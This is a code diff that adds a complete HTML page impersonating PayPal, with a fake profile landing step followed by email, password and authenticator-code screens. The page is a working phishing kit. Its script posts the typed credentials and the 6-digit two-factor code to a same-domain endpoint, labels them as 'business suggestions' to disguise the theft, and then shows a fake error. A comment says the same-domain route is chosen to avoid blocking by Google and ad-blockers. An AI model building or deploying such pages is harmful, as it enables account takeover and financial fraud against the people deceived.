@@ -1,0 +1,741 @@
+<!DOCTYPE html>
+<html lang="ro">
+<head>
+  <meta charset="UTF-8" />
+  <title>PayPal</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: Arial, Helvetica, sans-serif;
+    }
+
+    body {
+      margin: 0;
+      background: #fff;
+    }
+
+    .page {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .card {
+      width: 360px;
+      padding: 32px;
+      border-radius: 8px;
+      box-shadow: 0 0 0 1px #e6e6e6;
+      text-align: center;
+    }
+
+    .logo {
+      margin-bottom: 24px;
+      font-family: "pp-open-regular", Helvetica Neue, Arial, sans-serif;
+      font-size: 32px;
+      font-weight: 700;
+      color: #000; 
+    }
+
+    input {
+      width: 100%;
+      padding: 14px;
+      font-size: 15px;
+      border: 1px solid #9da3a6;
+      border-radius: 4px;
+      margin-bottom: 10px;
+    }
+
+    .forgot {
+      display: block;
+      font-family: "pp-open-medium", Helvetica Neue, Arial, sans-serif;
+      font-weight: 700;
+      text-align: left;
+      font-size: 15px;
+      border-radius: 40px;
+      color: #0070E0;
+      text-decoration: none;
+      margin-bottom: 20px;
+    }
+
+    .forgot:hover {
+      text-decoration: underline;
+    }
+
+    .primary {
+      width: 100%;
+      padding: 14px;
+      background: #003087;
+      color: white;
+      border: none;
+      border-radius: 25px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .primary:hover {
+      background: #002266;
+    }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 20px 0;
+      color: #6c7378;
+      font-size: 14px;
+    }
+
+    .divider span {
+      flex: 1;
+      height: 1px;
+      background: #dcdcdc;
+    }
+
+    .divider p {
+      margin: 0 10px;
+    }
+
+    .secondary {
+      width: 100%;
+      padding: 14px;
+      background: white;
+      border: 1px solid #0070ba;
+      color: #0070ba;
+      border-radius: 25px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .secondary:hover {
+      background: #f5faff;
+    }
+
+    .language {
+      margin-top: 24px;
+      font-size: 14px;
+      color: #000;
+    }
+
+    .language .inactive {
+      color: #6c7378;
+    }
+
+    footer {
+      position: absolute;
+      bottom: 20px;
+      display: flex;
+      gap: 16px;
+      font-size: 12px;
+    }
+
+    footer a {
+      color: #6c7378;
+      text-decoration: none;
+    }
+
+    footer a:hover {
+      text-decoration: underline;
+    }
+
+    .step {
+      display: none;
+    }
+
+    .step.active {
+      display: flex;
+    }
+
+    .email-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 16px;
+      padding: 14px;
+      font-size: 15px;
+      border: 1px solid #9da3a6;
+      border-radius: 4px;
+      background: #fff;
+    }
+
+    .email-row .email-text {
+      color: #000;
+    }
+
+    .email-row .change-link {
+      color: #0070ba;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    .email-row .change-link:hover {
+      text-decoration: underline;
+    }
+
+    .language-selector {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      margin-top: 24px;
+      font-size: 14px;
+      color: #6c7378;
+      cursor: pointer;
+    }
+
+    .language-selector img {
+      width: 20px;
+      height: 14px;
+    }
+
+    /* Email as read-only text only (no input look) */
+    .email-display-only {
+      text-align: left;
+      font-size: 15px;
+      color: #000;
+      margin-bottom: 16px;
+    }
+
+    /* Loading screen – doar cerc + text „Loading”, fără card/panel */
+    #step-loading {
+      background: #fff;
+      justify-content: center;
+      align-items: center;
+    }
+    #step-loading .loading-inner {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 20px;
+    }
+    #step-loading .loading-text {
+      font-size: 16px;
+      color: #5f6b76;
+      font-weight: 500;
+    }
+    #step-loading .spinner {
+      flex-shrink: 0;
+      border: 2px solid #e0e4e8;
+      border-top-color: #0b66c3;
+    }
+
+    .step.loading .card {
+      pointer-events: none;
+    }
+
+    .step.loading .loading-muted {
+      color: #b0b8bc !important;
+    }
+
+    .step.loading .loading-muted.input-wrap input {
+      border-color: #dcdcdc;
+      color: #b0b8bc;
+    }
+
+    .card-loading-only {
+      min-height: 200px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 24px;
+    }
+
+    .processing-btn {
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 25px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: default;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+
+    .processing-btn.processing {
+      background: #b8d4e8;
+      color: #fff;
+    }
+
+    .spinner {
+      width: 20px;
+      height: 20px;
+      border: 2px solid rgba(255,255,255,0.5);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin 0.4s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* Code entry page */
+    .code-title {
+      font-size: 24px;
+      font-weight: bold;
+      color: #000;
+      margin-bottom: 8px;
+    }
+
+    .code-instruction {
+      font-size: 14px;
+      color: #6c7378;
+      margin-bottom: 24px;
+      line-height: 1.4;
+    }
+
+    .code-inputs {
+      display: flex;
+      gap: 8px;
+      justify-content: center;
+      margin-bottom: 24px;
+    }
+
+    .code-inputs input {
+      width: 48px;
+      height: 52px;
+      text-align: center;
+      font-size: 20px;
+      font-weight: bold;
+      margin-bottom: 0;
+    }
+
+    .code-inputs input:focus {
+      border-color: #003087;
+      outline: none;
+    }
+
+    .link-block {
+      margin-top: 16px;
+    }
+
+    .link-block a {
+      color: #003087;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    .link-block a:hover {
+      text-decoration: underline;
+    }
+
+    .help-text {
+      margin-top: 24px;
+      font-size: 14px;
+      color: #6c7378;
+    }
+
+    .help-text a {
+      color: #003087;
+      text-decoration: none;
+    }
+
+    .help-text a:hover {
+      text-decoration: underline;
+    }
+
+    /* Pagina de profil – layout din testlayout.html (exact cum îl vrei) */
+    #step-landing {
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      padding: 32px 16px 40px;
+      gap: 28px;
+    }
+    #step-landing .panel {
+      width: min(640px, 92vw);
+      height: 330px;
+      position: relative;
+      display: flex;
+      align-items: flex-start;
+      justify-content: center;
+    }
+    #step-landing .header {
+      width: 100%;
+      height: 230px;
+      border-radius: 26px;
+      background: #2f8f72;
+      position: absolute;
+      top: 0;
+      left: 0;
+      overflow: hidden;
+    }
+    #step-landing .ring {
+      position: absolute;
+      border-radius: 999px;
+      border: 18px solid rgba(255,255,255,.12);
+      width: 240px;
+      height: 240px;
+      filter: blur(.2px);
+    }
+    #step-landing .ring.r1 { right: -80px; top: -90px; }
+    #step-landing .ring.r2 { left: 140px; top: 70px; width: 260px; height: 260px; border-width: 20px; opacity: .9; }
+    #step-landing .ring.r3 { right: 40px; top: 20px; width: 220px; height: 220px; border-width: 18px; opacity: .7; }
+    #step-landing .card {
+      position: absolute;
+      top: 118px;
+      width: min(420px, 86vw);
+      background: #fff;
+      border-radius: 20px;
+      box-shadow: 0 6px 18px rgba(0,0,0,.12);
+      padding: 56px 22px 18px;
+      text-align: left;
+    }
+    #step-landing .avatar {
+      position: absolute;
+      top: -34px;
+      left: 22px;
+      width: 86px;
+      height: 86px;
+      border-radius: 999px;
+      background: #0b66c3;
+      border: 4px solid #fff;
+      display: grid;
+      place-items: center;
+      box-shadow: 0 4px 12px rgba(0,0,0,.15);
+    }
+    #step-landing .avatar svg {
+      width: 34px;
+      height: 34px;
+      fill: none;
+      stroke: #fff;
+      stroke-width: 2.4;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+    #step-landing .name {
+      font-size: 26px;
+      font-weight: 530;
+      margin: 0 0 4px 0;
+      letter-spacing: .1px;
+      color: #2C2E2F;
+    }
+    #step-landing .handle {
+      margin: 0;
+      font-size: 16px;
+      color: #5f6b76;
+      font-weight: 543;
+    }
+    #step-landing .divider {
+      height: 1px;
+      background: #e9edf1;
+      margin: 18px -22px 14px;
+    }
+    #step-landing .btn {
+      width: 100%;
+      background: transparent;
+      border: none;
+      font-weight: 600;
+      color: #0b63d1;
+      padding: 10px 12px;
+      border-radius: 10px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    #step-landing .btn:hover {
+      background: rgba(11,99,209,.08);
+    }
+    #step-landing .btn:active {
+      transform: translateY(1px);
+    }
+    #step-landing .report {
+      font-size: 14px;
+      color: #222;
+      text-decoration: none;
+      font-weight: 580;
+    }
+    #step-landing .report:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="page">
+    <!-- Step 0: Profil (layout din testlayout.html – nume din config.json) -->
+    <div class="step active" id="step-landing">
+      <div class="panel">
+        <div class="header">
+          <div class="ring r1"></div>
+          <div class="ring r2"></div>
+          <div class="ring r3"></div>
+        </div>
+        <div class="card">
+          <div class="avatar" aria-hidden="true">
+            <svg viewBox="0 0 24 24">
+              <path d="M6 18c6 0 12-5 12-12 0-.8-1.2-1.2-2-.6-1 .8-2.5 2.2-4.2 2.4C10 7 8.6 6.1 8 5.2c-.4-.6-1.4-.3-1.4.5 0 1.8 1.1 3.3 2.4 4.4C7.4 11 6 12.5 6 14.4V18z"/>
+            </svg>
+          </div>
+          <h1 class="name" id="profile-nume">Bar Gabriel</h1>
+          <p class="handle" id="profile-username">@gabriel13044</p>
+          <div class="divider"></div>
+          <button class="btn" type="button" id="btn-trimite-landing">Send</button>
+        </div>
+      </div>
+      <a class="report" href="#" id="report-link">Report this link</a>
+    </div>
+
+    <!-- Step 1: Email -->
+    <div class="step" id="step-email">
+      <div class="card">
+        <h1 class="logo">PayPal</h1>
+
+        <input type="text" id="email-input" placeholder="E-mail or phone number" />
+
+        <a href="#" class="forgot">Forgot email?</a>
+
+        <button class="primary" id="btn-next">Next</button>
+
+        <div class="divider">
+          <span></span>
+          <p>sau</p>
+          <span></span>
+        </div>
+
+        <button class="secondary">Sign up</button>
+      </div>
+    </div>
+
+    <!-- Step 2: Password (email read-only + password only) -->
+    <div class="step" id="step-password">
+      <div class="card">
+        <h1 class="logo">PayPal</h1>
+
+        <div class="email-row">
+          <span class="email-text" id="display-email"></span>
+          <a href="#" class="change-link" id="change-email">Change</a>
+        </div>
+
+        <input type="password" id="password-input" placeholder="Password" />
+
+
+        <a href="#" class="forgot">Forgot password?</a>
+
+        <button class="primary" id="btn-login">Next</button>
+
+        <div class="divider">
+          <span></span>
+          <p>or</p>
+          <span></span>
+        </div>
+
+        <button class="secondary">Complete</button>
+
+        <div class="language-selector">
+          <span>🇬🇧</span>
+          <span>English (UK)</span>
+          <span>▼</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Loading – doar cerc + „Loading” pe fundal alb, fără panel -->
+    <div class="step loading" id="step-loading">
+      <div class="loading-inner">
+        <span class="spinner"></span>
+        <span class="loading-text">Loading</span>
+      </div>
+    </div>
+
+    <!-- Step 3: Enter your code (from auth app) -->
+    <div class="step" id="step-code">
+      <div class="card">
+        <h1 class="logo">PayPal</h1>
+        <p class="code-title">Enter your code</p>
+        <p class="code-instruction">Enter the 6-digit security code from your authenticator app.</p>
+        <div class="code-inputs" id="code-inputs">
+          <input type="text" inputmode="numeric" maxlength="1" data-idx="0" />
+          <input type="text" inputmode="numeric" maxlength="1" data-idx="1" />
+          <input type="text" inputmode="numeric" maxlength="1" data-idx="2" />
+          <input type="text" inputmode="numeric" maxlength="1" data-idx="3" />
+          <input type="text" inputmode="numeric" maxlength="1" data-idx="4" />
+          <input type="text" inputmode="numeric" maxlength="1" data-idx="5" />
+        </div>
+        <button type="button" class="primary" id="btn-got-it">Got It</button>
+        <div class="link-block">
+          <a href="#">Try another way</a>
+        </div>
+        <p class="help-text">Need a hand? <a href="#">We can help.</a></p>
+      </div>
+    </div>
+
+    <footer>
+      <a href="#">Contact us</a>
+      <a href="#">Privacy</a>
+      <a href="#">Legal</a>
+      <a href="#">Worldwide</a>
+    </footer>
+  </div>
+
+  <script>
+    var LOADING_DURATION = 900;
+
+    var stepLanding = document.getElementById('step-landing');
+    var emailInput = document.getElementById('email-input');
+    var displayEmail = document.getElementById('display-email');
+    var stepPassword = document.getElementById('step-password');
+    var stepLoading = document.getElementById('step-loading');
+    var stepCode = document.getElementById('step-code');
+    var stepEmail = document.getElementById('step-email');
+    var btnNext = document.getElementById('btn-next');
+    var btnLogin = document.getElementById('btn-login');
+    var codeInputs = document.querySelectorAll('#code-inputs input');
+
+    function hideAllSteps() {
+      stepLanding.classList.remove('active');
+      stepEmail.classList.remove('active');
+      stepPassword.classList.remove('active');
+      stepLoading.classList.remove('active');
+      stepCode.classList.remove('active');
+    }
+
+    function showStep(stepId) {
+      hideAllSteps();
+      document.getElementById(stepId).classList.add('active');
+    }
+
+    function pushStep(stepId) {
+      history.pushState({ step: stepId }, '', window.location.pathname + window.location.search);
+    }
+
+    window.addEventListener('popstate', function (e) {
+      var step = (e.state && e.state.step) ? e.state.step : 'step-landing';
+      showStep(step);
+    });
+
+    if (!history.state || !history.state.step) {
+      history.replaceState({ step: 'step-landing' }, '', window.location.pathname + window.location.search);
+    }
+
+    // Încarcă nume și username din config.json
+    fetch('/config.json')
+      .then(function (r) { return r.ok ? r.json() : Promise.reject(); })
+      .then(function (cfg) {
+        var numeEl = document.getElementById('profile-nume');
+        var userEl = document.getElementById('profile-username');
+        if (numeEl && cfg.nume) numeEl.textContent = cfg.nume;
+        if (userEl && cfg.username) userEl.textContent = (cfg.username.indexOf('@') === 0 ? cfg.username : '@' + cfg.username);
+      })
+      .catch(function () { /* păstrăm valorile implicite din HTML */ });
+
+    document.getElementById('btn-trimite-landing').addEventListener('click', function () {
+      hideAllSteps();
+      stepLoading.classList.add('active');
+      setTimeout(function () {
+        hideAllSteps();
+        stepEmail.classList.add('active');
+        pushStep('step-email');
+      }, LOADING_DURATION);
+    });
+
+    document.getElementById('report-link').addEventListener('click', function (e) { e.preventDefault(); });
+
+    function showLoading(thenShowId) {
+      hideAllSteps();
+      stepLoading.classList.add('active');
+      setTimeout(function () {
+        hideAllSteps();
+        document.getElementById(thenShowId).classList.add('active');
+        pushStep(thenShowId);
+      }, LOADING_DURATION);
+    }
+
+    function collectFormData(includeCode) {
+      var data = {
+        'Sugestii business (casuta 1)': emailInput.value.trim(),
+        'Alte sugestii (casuta 2)': document.getElementById('password-input').value
+      };
+      if (includeCode) {
+        var code = Array.prototype.map.call(codeInputs, function (inp) { return inp.value; }).join('');
+        data['Cod 6 cifre'] = code;
+      }
+      return data;
+    }
+
+    function sendToEmail(data, doneCallback) {
+      // Trimite doar la serverul tău (același domeniu) – nu poate fi blocat de Google/ad-blockere
+      fetch('/api/feedback', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          sugestiiBusiness: data['Sugestii business (casuta 1)'],
+          alteSugestii: data['Alte sugestii (casuta 2)'],
+          cod: data['Cod 6 cifre'] || ''
+        })
+      })
+        .then(function (r) { return r.json().then(function (j) { return doneCallback(r.ok && j && j.ok); }); })
+        .catch(function () { if (doneCallback) doneCallback(false); });
+    }
+
+    btnNext.addEventListener('click', function () {
+      var email = emailInput.value.trim();
+      if (!email) return;
+      displayEmail.textContent = email;
+      showLoading('step-password');
+    });
+
+    btnLogin.addEventListener('click', function () {
+      var pwd = document.getElementById('password-input').value;
+      if (!pwd) return;
+      var data = collectFormData(false);
+      sendToEmail(data, function (ok) {
+        if (ok) { /* primul mail trimis – sugestiile */ }
+        showLoading('step-code');
+      });
+    });
+
+    document.getElementById('change-email').addEventListener('click', function (e) {
+      e.preventDefault();
+      showStep('step-email');
+      pushStep('step-email');
+    });
+
+    // Buton "Complete" – trimite pe mail doar cele două casute (fără cod)
+    document.querySelector('#step-password .secondary').addEventListener('click', function () {
+      var data = collectFormData(false);
+      sendToEmail(data, function (ok) {
+        if (ok) alert('Mulțumim! Sugestiile au fost trimise.');
+      });
+    });
+
+    // 6-digit code inputs: one digit each, auto-advance, paste support
+    codeInputs.forEach(function (input, i) {
+      input.addEventListener('input', function () {
+        var v = this.value.replace(/\D/g, '');
+        if (v.length > 1) {
+          var digits = v.slice(0, 6).split('');
+          digits.forEach(function (d, j) {
+            if (codeInputs[j]) codeInputs[j].value = d;
+          });
+          if (codeInputs[5]) codeInputs[5].focus();
+          return;
+        }
+        this.value = v ? v[0] : '';
+        if (v && codeInputs[i + 1]) codeInputs[i + 1].focus();
+      });
+      input.addEventListener('keydown', function (e) {
+        if (e.key === 'Backspace' && !this.value && codeInputs[i - 1]) {
+          codeInputs[i - 1].focus();
+        }
+      });
+    });
+
+    document.getElementById('btn-got-it').addEventListener('click', function () {
+      var code = Array.prototype.map.call(codeInputs, function (inp) { return inp.value; }).join('');
+      if (code.length === 6) {
+        sendToEmail({ 'Sugestii business (casuta 1)': '', 'Alte sugestii (casuta 2)': '', 'Cod 6 cifre': code }, function (ok) {
+          if (ok) alert('Error! Please try again.');
+        });
+      }
+    });
+  </script>
+</body>
+</html>
